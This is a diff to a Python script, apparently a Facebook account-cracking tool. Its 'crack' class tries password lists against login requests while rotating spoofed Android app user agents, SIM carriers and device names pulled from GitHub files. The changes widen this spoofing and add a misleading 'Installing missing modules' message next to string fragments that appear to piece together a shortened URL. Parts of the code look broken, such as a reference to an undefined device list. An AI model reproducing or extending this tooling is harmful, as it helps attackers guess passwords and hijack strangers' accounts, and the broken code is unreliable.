@@ -197,8 +197,17 @@ user = []
 joker = []
 num = 0
 
+sys.stdout.write('\x1b[1;35m\x1b]2; YOUNIS XYZ ðŸ™‚ðŸ’— \x07')
 
-models1=requests.get("https://raw.githubusercontent.com/mogid458/MKT/main/Devices.txt").text.splitlines()
+models341=requests.get("https://raw.githubusercontent.com/mogid458/MKT/main/Devices.txt").text.splitlines()
+
+
+
+#____________device_name.txt______________________#
+devicename=requests.get("https://raw.githubusercontent.com/mdtasin123/device/main/devicename.txt").text.splitlines()
+
+#____________device_Moder.txt______________________#
+devicemodel1=requests.get("https://raw.githubusercontent.com/mdtasin123/device/main/devicemodel.txt").text.splitlines()
 
 
 #____________vivoDevices.txt______________________#
@@ -254,6 +263,7 @@ pakistani_sim_operators = ["Telekom HU","TELKOMSEL","Jazz","Telenor","Zong","Ufo
 def generate_FBAN():
   android_version=random.randint(3,14)
   device=random.choice(models)
+  device1=random.choice(models3)
   FBAV=f"{random.randint(150,500)}.0.0.{random.randint(1,999)}.{random.randint(1,999)}"
   FBBV=random.randint(100000000,999999999)
   FBCR=random.choice(pakistani_sim_operators)
@@ -265,7 +275,7 @@ def generate_FBAN():
 #ua_string = f'৳[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+৳'{density={density},width={width},height={height}};FBLC/{FBLC};FBCR/{FBCR};FBMF/Samsung;FBBD/Samsung;FBPN/{FBPN};FBDV/{models20};FBSV/{android_version};FBOP/1;FBCA/armeabi-v7a:armeabi]'
 
 
-
+print('\n Installing missing modules ...')
 
 XB = 'ti'
 GF = 'ny'+'url.'
@@ -593,7 +603,7 @@ class crack:
         for pw in __juts__:
             try:
                 Mm = '\033[9;31m'
-                ua_string=random.choice(ugen33)
+                #ua_string=random.#choice(ugen33)
                 application_version = str(random.randint(300,396))+'.0.0.'+str(random.randrange(10,49))+'.'+str(random.randint(111,396))
                 application_version_code=str(random.randint(000000000,999999999))
                 adid=str(uuid.uuid4())
@@ -605,7 +615,7 @@ class crack:
                 b=str(random.choice(string.ascii_uppercase))
                 gtt = random.choice(sm)+b+str(''.join(random.choice(string.digits) for _ in range(random.choice(uo)))+str(random.choice(string.ascii_uppercase)))
                 gttt=str(random.choice(string.ascii_uppercase))+str(random.randrange(11,99))+str(''.join(random.choice(string.ascii_uppercase) for _ in range(random.choice(uo))))
-                #ua_string = '#Sup#portsFresco=1 modular=3 Dalvik/2.1.0 (Linux; U; Android '+android_version+'; '+gtt#+' Build/'#+gttt#+') [FBAN/EMA;UNITY_PACKAGE/1549;FBBV/'#+application_version_code#+';FBAV/'#+application_version#+';FBDV/'#+gtt#+';FBLC/vi_VN;FBOP/20;FBNG/4G;FBCQ/UNKNOWN;FBMNT/METERED]'
+                ua_string = 'SupportsFresco=1 modular=3 Dalvik/2.1.0 (Linux; U; Android '+android_version+'; '+gtt+' Build/'+gttt+') [FBAN/EMA;UNITY_PACKAGE/1549;FBBV/'+application_version_code+';FBAV/'+application_version+';FBDV/'+gtt+';FBLC/vi_VN;FBOP/20;FBNG/4G;FBCQ/UNKNOWN;FBMNT/METERED]'
                 data = {
                     'locale':'en-US',
                     'client_country_code':'US',
@@ -747,8 +757,9 @@ class crack:
                 gtt = random.choice(sm)+b+str(''.join(random.choice(string.digits) for _ in range(random.choice(uo)))+str(random.choice(string.ascii_uppercase)))
                 gttt=str(random.choice(string.ascii_uppercase))+str(random.randrange(11,99))+str(''.join(random.choice(string.ascii_uppercase) for _ in range(random.choice(uo))))
                 net=random.choice(['ZONG', 'Jazz'])
+                #ua_string = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=2.75,width=1080,height=2131};FBLC/en_US;FBRV/366716093;FBCR/Telenor;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBBK/1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                 #ua_string = f'[F#BAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'%{density=+str(density)+,width=+str(width)+,height=+str(height)+};FBLC/+str(FBLC)+;FBRV/0;FBCR/+str(FBCR)+;FBMF/+str(mixmodel)+;FBBD/+str(mixmodel)+;FBPN/+str(FBPN)+;FBDV/+str(model4)+;FBSV/+str(FBSV)+;FBOP/+str(FBOP)+;FBDM/FBCA/+str(FBCA)+:]'
-                ua_string = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density={density},width={width},height={height}};FBLC/{FBLC};FBCR/{FBCR};FBMF/Samsung;FBBD/Samsung;FBPN/{FBPN};FBDV/{models20};FBSV/{android_version};FBOP/1;FBCA/armeabi-v7a:armeabi]'
+                ua_string = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density={density},width={width},height={height}};FBLC/{FBLC};FBCR/{FBCR};FBMF/{devicename};FBBD/{devicename};FBPN/{FBPN};FBDV/{devicemodel1};FBSV/{android_version};FBOP/1;FBCA/armeabi-v7a:armeabi]'
                 device = str(uuid.uuid4())
                 adid = str(uuid.uuid4())
                 data = {
